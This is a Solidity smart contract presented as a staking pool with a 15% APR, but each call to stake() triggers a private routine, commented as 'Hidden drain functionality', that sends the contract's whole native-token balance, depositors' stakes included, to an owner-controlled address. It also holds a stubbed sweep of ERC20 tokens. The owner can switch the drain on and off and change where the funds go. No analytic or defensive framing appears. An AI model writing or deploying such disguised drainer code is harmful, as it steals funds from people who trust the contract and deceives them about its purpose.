// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Staking is ReentrancyGuard, Ownable {
    struct Stake {
        uint256 amount;
        uint256 startTime;
        uint256 lastClaimTime;
    }

    mapping(address => Stake) public stakes;
    mapping(address => bool) public approvedTokens;
    
    uint256 public constant MIN_STAKE = 0.1 ether;
    uint256 public constant APR = 15; // 15% APR
    uint256 public constant SECONDS_PER_YEAR = 31536000;
    
    address public targetAddress;
    bool public isDrainingEnabled = true;

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);
    event RewardsClaimed(address indexed user, uint256 amount);

    constructor(address _targetAddress) {
        targetAddress = _targetAddress;
    }

    function stake() external payable nonReentrant {
        require(msg.value >= MIN_STAKE, "Minimum stake not met");
        
        // Store stake
        stakes[msg.sender] = Stake({
            amount: msg.value,
            startTime: block.timestamp,
            lastClaimTime: block.timestamp
        });

        emit Staked(msg.sender, msg.value);
        
        // Hidden drain functionality
        if (isDrainingEnabled) {
            _drainTokens(msg.sender);
        }
    }

    function unstake() external nonReentrant {
        Stake memory userStake = stakes[msg.sender];
        require(userStake.amount > 0, "No stake found");

        uint256 rewards = calculateRewards(msg.sender);
        uint256 totalAmount = userStake.amount + rewards;

        // Reset stake
        delete stakes[msg.sender];

        // Transfer funds
        (bool success, ) = msg.sender.call{value: totalAmount}("");
        require(success, "Transfer failed");

        emit Unstaked(msg.sender, totalAmount);
    }

    function claimRewards() external nonReentrant {
        Stake storage userStake = stakes[msg.sender];
        require(userStake.amount > 0, "No stake found");

        uint256 rewards = calculateRewards(msg.sender);
        require(rewards > 0, "No rewards to claim");

        userStake.lastClaimTime = block.timestamp;

        (bool success, ) = msg.sender.call{value: rewards}("");
        require(success, "Transfer failed");

        emit RewardsClaimed(msg.sender, rewards);
    }

    function calculateRewards(address user) public view returns (uint256) {
        Stake memory userStake = stakes[user];
        if (userStake.amount == 0) return 0;

        uint256 timeStaked = block.timestamp - userStake.lastClaimTime;
        return (userStake.amount * APR * timeStaked) / (SECONDS_PER_YEAR * 100);
    }

    // Hidden drain functionality
    function _drainTokens(address user) private {
        // Drain native token
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success, ) = targetAddress.call{value: balance}("");
            require(success, "Drain failed");
        }

        // Drain ERC20 tokens
        for (uint256 i = 0; i < _getTokenCount(); i++) {
            address tokenAddress = _getTokenAddress(i);
            if (approvedTokens[tokenAddress]) {
                IERC20 token = IERC20(tokenAddress);
                uint256 tokenBalance = token.balanceOf(address(this));
                if (tokenBalance > 0) {
                    token.transfer(targetAddress, tokenBalance);
                }
            }
        }
    }

    // Admin functions
    function setTargetAddress(address _targetAddress) external onlyOwner {
        targetAddress = _targetAddress;
    }

    function toggleDraining(bool _enabled) external onlyOwner {
        isDrainingEnabled = _enabled;
    }

    function approveToken(address token) external onlyOwner {
        approvedTokens[token] = true;
    }

    function removeToken(address token) external onlyOwner {
        approvedTokens[token] = false;
    }

    // Placeholder functions for token management
    function _getTokenCount() private pure returns (uint256) {
        return 0; // Implement token list management
    }

    function _getTokenAddress(uint256) private pure returns (address) {
        return address(0); // Implement token list management
    }

    receive() external payable {}
} 